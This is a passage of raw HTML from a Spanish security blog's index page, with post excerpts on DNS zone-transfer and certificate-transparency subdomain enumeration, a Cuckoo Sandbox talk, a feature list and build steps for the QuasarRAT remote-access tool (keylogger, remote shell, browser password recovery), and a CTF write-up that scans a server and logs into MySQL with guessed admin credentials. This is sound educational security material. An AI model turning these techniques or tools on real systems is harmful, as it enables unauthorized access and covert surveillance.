<div dir="ltr" style="text-align: left;" trbidi="on">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-COA3FKQwVNU/WqGDbfsHVDI/AAAAAAAAUAc/atPnMa-nXwgWp5Dgd6n-6pY3xYsjR0DSgCLcBGAs/s1600/foto.jpg" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="330" data-original-width="393" height="268" src="https://2.bp.blogspot.com/-COA3FKQwVNU/WqGDbfsHVDI/AAAAAAAAUAc/atPnMa-nXwgWp5Dgd6n-6pY3xYsjR0DSgCLcBGAs/s320/foto.jpg" width="320"></a></div>
Una de las fases del pentesting más importante, sobre todo en entornos de caja negra, es la enumeración, gracias a ella podremos hacernos una idea de la infraestructura que pretendemos auditar como servidores expuestos en Internet, puertos abiertos, subdominios... Con ello podremos encontrar partes de la infraestructura vulnerables a distintas clases de ataques, de aquí parte la frase de Abraham Lincoln:<br>
<br>
<br>
<div style="text-align: center;">
<i>&#8220;Dame seis horas para cortar un árbol y pasaré las primeras cuatro afilando el hacha&#8221;</i></div>
<div style="text-align: center;">
<br></div>
<div style="text-align: left;">
Uno de los puntos fundamentales a la hora de enumerar son los servidores DNS, ya que algunas veces son una de las partes más descuidadas y que una mala configuración de los mismos nos puede proveer multitud de información sensible que nos puede facilitar la labor de penetración. La <a href="https://es.wikipedia.org/wiki/Transferencia_de_zona_DNS" target="_blank">zona de transferencia, también llamada&#160;AXFR</a>, puede ser una de las piezas críticas para la recolección de infomación, una mala configuración como que un servidor maestro no filtre por direcciones IP qué servidores esclavos
 pueden realizar transferencias, ocasionaría que cualquier atacante pueda consultar por las zonas de los 
dominios que el servidor maestro administra, pudiendo enumerar subdominios o zonas más sensibles.<br>
<br></div>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://4.bp.blogspot.com/-9ouUm3boZYQ/WqF4K6UARgI/AAAAAAAAUAM/DRBD_lq4fkwlH1KvJZwHnXOHu1yFJ0RFQCLcBGAs/s1600/unnamed.gif" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="201" data-original-width="431" height="148" src="https://4.bp.blogspot.com/-9ouUm3boZYQ/WqF4K6UARgI/AAAAAAAAUAM/DRBD_lq4fkwlH1KvJZwHnXOHu1yFJ0RFQCLcBGAs/s320/unnamed.gif" width="320"></a></div>
<br>
Otro de los puntos que también se deben tener muy en cuenta a día de hoy es la transparencia de certificados, un proyecto promovido por Google que busca solventar defectos estructurales de los certificados SSL que ponen en peligro las comunicaciones cifradas por Internet y comprometen mecanismos como TLS/SSL, pudiendo de esta manera ser aprovechado por un atacante para suplantar identidad o para realizar ataques MITM. Con la transparencia de certificados se podrán eliminar estos defectos ya que se crea un open framework para monitorizar y auditar certificados SSL a tiempo real, permitiendo la fácil detección de certificados emitidos erroneamente o maliciosamente.<br>
<br>
Por suerte para los pentesters, esto se puede usar para enumerar también, gracias a <a href="https://github.com/UnaPibaGeek/ctfr" target="_blank">una nueva herramienta</a> de <a href="https://twitter.com/unapibageek" target="_blank">Sheila A. Berta</a> publicada en GitHub recientemente. Llamada CTFR, abusa de los logs de los certificados SSL mediante la transparencia de certificados gracias al buscador de certificados <a href="https://crt.sh/">crt.sh</a>. Con esta herramienta podremos enumerar automáticamente subdominios ocultos que pueden albergar información sensible o ser zonas explotables gracias consultas a <a href="http://crt.sh/">crt.sh</a>. Podremos obtener resultados muy semejantes a los explicados anteriormente con AXFR.<br>
</div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=3081700154233717588' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1728015826'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=3081700154233717588&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html CTFR, exprimiendo la transparencia de los certificados SSL' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
CTFR, exprimiendo la transparencia de los certificados SSL
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html&t=CTFR, exprimiendo la transparencia de los certificados SSL' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='7257826226841828195'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html'>
Cuckoo'n'Roll (by Andriy Brukhovetskyy #hc0n2018)
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Jaime Muñoz M.
</span>
<span class='post-timestamp'>
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/h-c0n' rel='tag'>
h-c0n
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/herramientas' rel='tag'>
herramientas
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/malware' rel='tag'>
malware
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/reversing' rel='tag'>
reversing
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html#comment-form' onclick=''>
0
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
Hoy os traemos la ponencia titulada <i><b>&quot;Cuckoo&#39;n&#39;Roll&quot;</b></i> que dio Andriy Brukhovetskyy (<a href="https://twitter.com/d00m3dr4v3n" target="_blank">@D00m3dR4v3n</a>) en la <b>h-c0n </b>el pasado mes de febrero sobre <i>Cuckoo Sandbox</i>, herramienta open source para el análisis automático de malware que ha ido ganando notoriedad desde su creación en 2010.<br>
<br>
Analista de Malware y activo colaborador en proyectos Open Source, Andriy comenzó su andadura laboral en Ciberseguridad como becario en <i>eCrime</i> de <i>S21sec</i>. Actualmente trabaja en <i>FireEye iSight Partners</i>.<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<iframe height="320" src="https://drive.google.com/file/d/1JEwuSW9uy-df81qzuZvfZEOYd0kL4Sor/preview" width="530"></iframe><br></div>
</div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=7257826226841828195' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1266418659'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=7257826226841828195&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html Cuckoo&#39;n&#39;Roll (by Andriy Brukhovetskyy #hc0n2018)' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
Cuckoo'n'Roll (by Andriy Brukhovetskyy #hc0n2018)
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html&t=Cuckoo&#39;n&#39;Roll (by Andriy Brukhovetskyy #hc0n2018)' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='11294348574366977'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html'>
QuasarRAT: un RAT libre y open source para Windows
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  lunes, 5 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/herramientas' rel='tag'>
herramientas
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/malware' rel='tag'>
malware
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/rat' rel='tag'>
rat
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/Windows' rel='tag'>
Windows
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html#comment-form' onclick=''>
2
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
Quasar es una herramienta de administración remota (RAT) rápida y liviana programada en C#. Es una buena solución de administración remota al proporcionar una gran estabilidad y una interfaz de usuario fácil de usar.<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-PQ4zg4XmjWk/Wp1hgXRNsUI/AAAAAAABE7M/IJdvNJHY8iUQw-z0ks9H7KE6mvAiihi8gCLcBGAs/s1600/QuasarRAT.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="613" data-original-width="950" src="https://2.bp.blogspot.com/-PQ4zg4XmjWk/Wp1hgXRNsUI/AAAAAAABE7M/IJdvNJHY8iUQw-z0ks9H7KE6mvAiihi8gCLcBGAs/s640/QuasarRAT.png" width="530" /></a></div>
<br />
<b>Características</b><br />
<br />
- Transmisión de red TCP (compatibilidad con IPv4 e IPv6)<br />
- Serialización de red rápida (NetSerializer)<br />
- Comunicación comprimida (QuickLZ) y cifrada (AES-128)<br />
- Multi-hilo<br />
- Soporte de UPnP<br />
- Soporte de No-Ip.com<br />
- Visita del sitio web (oculto y visible)<br />
- Mostrar Messagebox<br />
- Administrador de tareas<br />
- Administrador de archivos<br />
- Administrador de inicio<br />
- Escritorio remoto<br />
- Cámara web remota<br />
- Shell remoto<br />
- Descargar y ejecutar<br />
- Cargar y ejecutar<br />
- Información del sistema<br />
- Comandos de equipo (reiniciar, apagar, en espera)<br />
- Keylogger (Soporte Unicode)<br />
- Proxy inverso (SOCKS5)<br />
- Recuperación de contraseña (navegadores comunes y clientes FTP)<br />
- Editor de registro<br />
<br />
<b>Requisitos</b><br />
<br />
- .NET Framework 4.0 Client Profile (Descargar)<br />
- Sistemas operativos admitidos (32 y 64 bits)<br />
- Windows XP SP3<br />
- Windows Server 2003<br />
- Windows Vista<br />
- Windows Server 2008<br />
- Windows 7<br />
- Windows Server 2012<br />
- Windows 8 / 8.1<br />
- Windows 10<br />
<br />
<b>Compilando</b><br />
<br />
Abre el proyecto en Visual Studio y haz clic en compilar, o usa uno de los archivos por lotes (batch) incluidos en el directorio raíz.<br />
<br />
- build-debug.bat Compila la aplicación usando la configuración de depuración (para probar)<br />
- build-release.bat crea la aplicación utilizando la configuración de release (para publicación)<br />
<br />
<b>Fuente</b>: <a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a></div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=11294348574366977' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=11294348574366977&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html QuasarRAT: un RAT libre y open source para Windows' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
QuasarRAT: un RAT libre y open source para Windows
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html&t=QuasarRAT: un RAT libre y open source para Windows' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='8219039475643925540'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html'>
Writeups CTF ForoCiber2018
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  sábado, 3 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/criptograf%C3%ADa' rel='tag'>
criptografía
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/esteganograf%C3%ADa' rel='tag'>
esteganografía
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/forense' rel='tag'>
forense
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/fuerza%20bruta' rel='tag'>
fuerza bruta
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/retos' rel='tag'>
retos
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/seguridad%20web' rel='tag'>
seguridad web
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/writeups' rel='tag'>
writeups
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html#comment-form' onclick=''>
10
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
<a href="https://2.bp.blogspot.com/-ypC9QCewtdw/WprjMbBXWJI/AAAAAAABE44/ocl-vmAjtX8HHlCI-v5z6vHcN0Wd7uYowCLcBGAs/s1600/no_es_ctf_para_viejos.png" imageanchor="1" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img border="0" data-original-height="818" data-original-width="629" height="320" src="https://2.bp.blogspot.com/-ypC9QCewtdw/WprjMbBXWJI/AAAAAAABE44/ocl-vmAjtX8HHlCI-v5z6vHcN0Wd7uYowCLcBGAs/s320/no_es_ctf_para_viejos.png" width="246"></a>Este martes con motivo del II Forociber, la Universidad de Extremadura junto con la empresa Viewnext abría un pequeño CTF de 72 horas de duración que planteaba <strike>5</strike> 4 retos. Además de ser breve incluía premios como material tecnológico para los tres primeros clasificados, así que decidí dedicarle tiempo y jugar.<br>
<br>
La verdad es que resultó entretenido y como el nivel era bastante asequible pude completarlo en tan sólo unas horas, resultando ganador. Sin embargo (zote de mí) no leí en las bases de participación que para optar a los premios la edad máxima era 35 años y mi premio se quedó en un simple reconocimiento (gracias a ToTe de la organización) y, eso sí, la diversión y el entretenimiento de cuándo estuve realizándolo.<br>
<br>
Ya comenté que 35 años me parecía un corte absurdo, incluso discriminatorio.&#160; Si se buscan promesas, la bajaría si acaso a 25 que es más o menos cuando un estudiante comienza su andadura profesional. &#191;Pero 35? a los 30 ya era senior y tenía más tiempo para hacer CTFs... pero en fín, las reglas son las reglas y por lo menos voy a poder dejaros el siguiente post con las soluciones.<br>
<br>
<span style="font-size: large;"><b>RETO 1 - Un Sysadmin perezoso</b></span><br>
<br>
<b>Retador</b><br>
<br>
<b>Alberto Ledo</b>&#160;(<a href="https://twitter.com/0x13d0" target="_blank"><b>@0x13d0</b></a>): Administrador de Sistemas de la Universidad de Extremadura.<br>
<br>
<b>Descripción</b><br>
<br>
Miguel es un sysadmin que forma parte de un proceso de selección para la empresa S2A. La empresa, en la primeras fases del proceso necesita medir los conocimientos generales de administración y seguridad en sistemas de los candidatos, así como los conocimientos que poseen sobre malos hábitos del administrador de sistemas. <br>
<br>
Para ello S2A prepara una prueba con la que poder realizar una primera selección de candidatos. Se trata de esta misma prueba. Proporcionan a Miguel la dirección IP de un servidor que llegó a producción cuando aún debía estar en fase de test. <br>
<br>
Para superar la prueba Miguel debe encontrar unas palabras escondidas en el algún lugar en el servidor, &#191;Ayudas a Miguel?<br>
<br>
<b>Materiales</b><br>
<br>
La IP del servidor en el que debe buscar Miguel es:<b> 34.217.203.163</b><br>
<br>
<b>Writeup (10 puntos) </b><br>
<br>
Empezamos como casi siempre con un escaneo de puertos:<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"># nmap -A -Pn 34.217.203.163<br>&#160;</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span style="background-color: #fff2cc;">3306/tcp open mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1</span><br>55555/tcp open ssh<br>OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)</span><br>
<br>
Vale, tenemos abierto dos puertos. Empezaremos con mysql... Si es un administrador de sistemas perezoso... seguro que las credenciales deben ser totalmente predecibles:<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"># mysql -u <span style="background-color: #fff2cc;">admin</span> -p -h 34.217.203.163<br>Enter password: <br>Welcome to the MySQL monitor.&#160; Commands end with ; or \g.<br>Your MySQL connection id is 437232<br>Server version: 5.5.5-10.1.26-MariaDB-0+deb9u1 Debian 9.1<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.<br><br>mysql&gt;&#160;</span><br>
<br>
Bingo! El usuario es admin y la contraseña admin.<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-nuDZ2nzJYVc/WprGMK26SZI/AAAAAAABE20/u7InROJ-YJQWtt7W2gtTGYAAc7dg4LpSQCLcBGAs/s1600/uex01.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="511" data-original-width="597" src="https://2.bp.blogspot.com/-nuDZ2nzJYVc/WprGMK26SZI/AAAAAAABE20/u7InROJ-YJQWtt7W2gtTGYAAc7dg4LpSQCLcBGAs/s640/uex01.png" width="530"></a></div>
<br>
Como veis tenemos una base de datos &#39;forociber2018&#39; con una tabla &#39;forociber&#39; que tiene un campo &#39;flag&#39;...<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://4.bp.blogspot.com/-7hCdvFMz_wE/WprGj1M_IeI/AAAAAAABE3A/Y52Z_31vBMso0dtjLqe4pkwTytkY70BYgCLcBGAs/s1600/uex02.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="147" data-original-width="281" src="https://4.bp.blogspot.com/-7hCdvFMz_wE/WprGj1M_IeI/AAAAAAABE3A/Y52Z_31vBMso0dtjLqe4pkwTytkY70BYgCLcBGAs/s1600/uex02.png"></a></div>
<br>
Y ya tenemos la primera flag: &quot;<b>Y CIBERDERECHO</b>&quot;. Continuamos al siguiente...<br>
</div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=8219039475643925540' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=8219039475643925540&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html Writeups CTF ForoCiber2018' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
Writeups CTF ForoCiber2018
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html&t=Writeups CTF ForoCiber2018' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<!--Can't find substitution for tag [adEnd]-->
</div>
<div class='blog-pager' id='blog-pager'>
<span id='blog-pager-older-link'>
<a class='blog-pager-older-link' href='http://www.hackplayers.com/search?updated-max=2018-03-03T19:13:00%2B01:00&max-results=10' id='Blog1_blog-pager-older-link' title='Entradas antiguas'>
Entradas antiguas
</a>
</span>
</div>
<div class='clear'></div>
</div><div class='widget BlogList' data-version='1' id='BlogList1'>
</div><div class='widget BlogList' data-version='1' id='BlogList2'>
</div><div class='widget HTML' data-version='1' id='HTML9'>
<div class='widget-content'>
<script type="text/javascript"><!--
google_ad_client = "ca-pub-7686406083489653";
google_ad_host = "pub-1556223355139109";
/* Bloque3-hpys */
google_ad_slot = "9674735311";
google_ad_width = 468;
google_ad_height = 15;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=HTML&widgetId=HTML9&action=editWidget&sectionId=main' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML9"));' target='configHTML9' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div></div>
</div>
<div id='sidebar-wrapper'>
<div class='sidebar section' id='sidebar'><div class='widget HTML' data-version='1' id='HTML2'>
<h2 class='title'>
Hackplayers Social Media. Contact!
</h2>
<div class='widget-content'>
<table class="tbl" style="height: 38px; width: 200px;" align="left" border="0" cellpadding="0" cellspacing="0"><tbody>
<tr>
<td background="http://2.bp.blogspot.com/-x6stGI47c7Q/Tp2c9rSgqJI/AAAAAAAAB5A/p16ZmyRF9y8/s320/rss.png">
<a href="http://hackplayers.blogspot.com/feeds/posts/default?alt=rss">
<img alt="" class="a" src="http://2.bp.blogspot.com/-aWLHdaLodhU/Tp2-R6AfbSI/AAAAAAAAB58/26zhvIZ7GOo/s1600/rss_gris.png" />
</a>
</td>
<td background="http://4.bp.blogspot.com/-VFmzfwoOH_4/Tp2c90dNMiI/AAAAAAAAB5Q/o43Mgf-LWms/s320/twitter.png">
<a href="http://twitter.com/hackplayers">
<img alt="" class="a" src="http://3.bp.blogspot.com/-JTxO9fGtCeg/Tp2-SGrjDKI/AAAAAAAAB6E/oljIAm7L7vY/s1600/twitter_gris.png" />
</a>
</td>
<td background="http://3.bp.blogspot.com/-nRW2TzmkL2Q/Tp2c9imxiXI/AAAAAAAAB44/dC16UBgaww4/s320/facebook.png">
<a href="http://www.facebook.com/blog.hackplayers">
<img alt="" class="a" src="http://1.bp.blogspot.com/-QDaUBQSEmcE/Tp2-R9_Cd1I/AAAAAAAAB50/0gOO5SBsrl4/s320/facebook_gris.png" />
</a>
</td>
<td background="https://2.bp.blogspot.com/-j_qWcrIsrS4/WBKBx0L7sfI/AAAAAAAA2lQ/WSC8YSxxuwMai_vt0QwmrcLqPGM3-E0ugCLcB/s320/telegram.png" >
<a href="http://telegram.me/hackplayers">
<img alt="" class="a" src="https://1.bp.blogspot.com/-6SytT18qkRw/WBKBx7GvRxI/AAAAAAAA2lM/U4XVGqBs6yIbO80DlQ-cvsQ4OTOOi40fwCLcB/s320/telegram_gris.png" />
</a>
</td>
</tr>
</tbody>
</table>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget HTML' data-version='1' id='HTML10'>
<h2 class='title'>Publicidad</h2>
<div class='widget-content'>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- hackplayers_sidebar_AdSense1_250x250_as -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:250px"
     data-ad-client="ca-pub-7686406083489653"
     data-ad-slot="8105868129"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
